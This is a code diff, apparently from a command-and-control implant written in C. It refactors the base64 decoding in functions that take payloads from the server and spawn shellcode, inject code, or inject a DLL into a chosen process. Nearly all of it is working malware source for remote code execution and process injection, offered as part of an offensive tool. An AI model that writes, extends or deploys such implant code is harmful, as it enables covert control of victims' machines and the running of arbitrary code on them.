@@ -15,7 +15,7 @@
 
 // local
 
-#include "base64.h"
+#include "../../modules/base64.h"
 #include "imports.h"
 #include "strings.h"
 #include "compression.h"
@@ -570,13 +570,12 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
 BOOL SpawnExecuteCode(char* Base64Buffer)
 {
-    size_t out_len   = strlen(Base64Buffer) + 1;
-    size_t b64_len   = b64_decoded_size(Base64Buffer);
-    char*  b64_out   = (char*)malloc(out_len);
+    size_t len   = strlen(Base64Buffer);
+    size_t out_len = 0;
 
-    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);
+    unsigned char *out_buffer = base64_decode((const unsigned char *)Base64Buffer, len, &out_len);
 
-    return SpawnCode(b64_out, b64_len);
+    return SpawnCode(out_buffer, out_len);
 }
 
 BOOL InjectExecuteCode(char* Buffer)
@@ -591,17 +590,16 @@ BOOL InjectExecuteCode(char* Buffer)
     // get the base64 data to inject
     parsed_json = json_tokener_parse(Buffer);
     parsed_json = json_object_object_get(parsed_json, "data");
-    char* data = json_object_get_string(parsed_json);
+    unsigned char* data = json_object_get_string(parsed_json);
 
     // decode that base64 data
-    size_t out_len   = strlen(data) + 1;
-    size_t b64_len   = b64_decoded_size(data);
-    char*  b64_out   = (char*)malloc(out_len);
+    size_t len     = strlen(data);
+    size_t out_len = 0;
 
-    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+    unsigned char* out = base64_decode((const unsigned char*)data, len, &out_len);
 
     // inject the code
-    return InjectCode(b64_out, b64_len, pid);
+    return InjectCode(out, out_len, pid);
 }
 
 BOOL InjectExecuteDll(char* Buffer)
@@ -619,14 +617,13 @@ BOOL InjectExecuteDll(char* Buffer)
     char* data = json_object_get_string(parsed_json);
 
     // decode that base64 dll
-    size_t out_len   = strlen(data) + 1;
-    size_t b64_len   = b64_decoded_size(data);
-    char*  b64_out   = (char*)malloc(out_len);
+    size_t     len   = strlen(data);
+    size_t out_len   = 0;
 
-    b64_out = base64_decode((const char*)data, out_len - 1, &out_len);
+    unsigned char* out = base64_decode((const unsigned char*)data, len, &out_len);
 
     // inject the code
-    return InjectDLL(b64_out, b64_len, pid);
+    return InjectDLL(out, out_len, pid);
 }
 
 BOOL Stdlib(char* Buffer)
